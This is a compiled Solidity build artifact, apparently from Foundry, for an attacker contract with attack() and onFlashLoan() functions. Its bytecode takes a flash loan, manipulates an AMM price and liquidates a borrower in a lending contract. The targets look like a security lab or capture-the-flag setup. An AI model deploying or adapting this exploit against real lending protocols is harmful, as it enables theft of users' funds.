{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract FlashLender",
          "name": "_flashLender",
          "type": "address"
        },
        {
          "internalType": "contract CollateralToken",
          "name": "_token",
          "type": "address"
        },
        {
          "internalType": "contract AMM",
          "name": "_amm",
          "type": "address"
        },
        {
          "internalType": "contract Lending",
          "name": "_lending",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_borrower",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "onFlashLoan",
      "outputs": [
        {
          "internalType": "bytes32",
          "name": "",
          "type": "bytes32"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": {
    "object": "0x608060405260405161082038038061082083398101604081905261002291610102565b600080546001600160a01b03199081166001600160a01b038881169182179093556001805483168885169081179091556002805484168886161790556003805484168786161790556004805490931693851693909317825560405163095ea7b360e01b815291820152600019602482015263095ea7b3906044016020604051808303816000875af11580156100bb573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100df9190610177565b5050505050506101a0565b6001600160a01b03811681146100ff57600080fd5b50565b600080600080600060a0868803121561011a57600080fd5b8551610125816100ea565b6020870151909550610136816100ea565b6040870151909450610147816100ea565b6060870151909350610158816100ea565b6080870151909250610169816100ea565b809150509295509295909350565b60006020828403121561018957600080fd5b8151801515811461019957600080fd5b9392505050565b610671806101af6000396000f3fe60806040526004361061002d5760003560e01c806323e30c8b146100395780639e5faafc1461006b57600080fd5b3661003457005b600080fd5b34801561004557600080fd5b50610059610054366004610553565b610082565b60405190815260200160405180910390f35b34801561007757600080fd5b50610080610272565b005b60015460025460405163a9059cbb60e01b81526001600160a01b03918216600482015260248101879052600092919091169063a9059cbb906044016020604051808303816000875af11580156100dc573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061010091906105f9565b5060025460405163175de65360e01b81523060048201526001600160a01b039091169063175de653906024016020604051808303816000875af115801561014b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061016f9190610622565b50600354600480546040516305f0caad60e31b81526001600160a01b039182169281019290925290911690632f86556890602401600060405180830381600087803b1580156101bd57600080fd5b505af11580156101d1573d6000803e3d6000fd5b505060025460405163a5db217160e01b81523060048201526001600160a01b03909116925063a5db21719150479060240160206040518083038185885af1158015610220573d6000803e3d6000fd5b50505050506040513d601f19601f820116820180604052508101906102459190610622565b507f439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9979650505050505050565b60005460015460405163613255ab60e01b81526001600160a01b03918216600482018190529190921691635cffe9de913091849063613255ab90602401602060405180830381865afa1580156102cc573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102f09190610622565b6040516001600160e01b031960e086901b1681526001600160a01b0393841660048201529290911660248301526044820152608060648201526000608482015260a4016020604051808303816000875af1158015610352573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061037691906105f9565b5060015460405163095ea7b360e01b815230600482015260001960248201526001600160a01b039091169063095ea7b3906044016020604051808303816000875af11580156103c9573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103ed91906105f9565b506001546040516370a0823160e01b815230600482018190526001600160a01b03909216916323b872dd91339084906370a0823190602401602060405180830381865afa158015610442573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104669190610622565b6040516001600160e01b031960e086901b1681526001600160a01b03938416600482015292909116602483015260448201526064016020604051808303816000875af11580156104ba573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104de91906105f9565b50604051600090339047908381818185875af1925050503d8060008114610521576040519150601f19603f3d011682016040523d82523d6000602084013e610526565b606091505b505090508061053457600080fd5b50565b80356001600160a01b038116811461054e57600080fd5b919050565b60008060008060008060a0878903121561056c57600080fd5b61057587610537565b955061058360208801610537565b94506040870135935060608701359250608087013567ffffffffffffffff808211156105ae57600080fd5b818901915089601f8301126105c257600080fd5b8135818111156105d157600080fd5b8a60208285010111156105e357600080fd5b6020830194508093505050509295509295509295565b60006020828403121561060b57600080fd5b8151801515811461061b57600080fd5b9392505050565b60006020828403121561063457600080fd5b505191905056fea26469706673582212204ea07d5f5911dab0bc10c59be5e8a5a9c9ed64664467387889a599aa1f01264764736f6c634300080f0033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "attack()": "9e5faafc",
    "onFlashLoan(address,address,uint256,uint256,bytes)": "23e30c8b"
  },
  "id": 27
}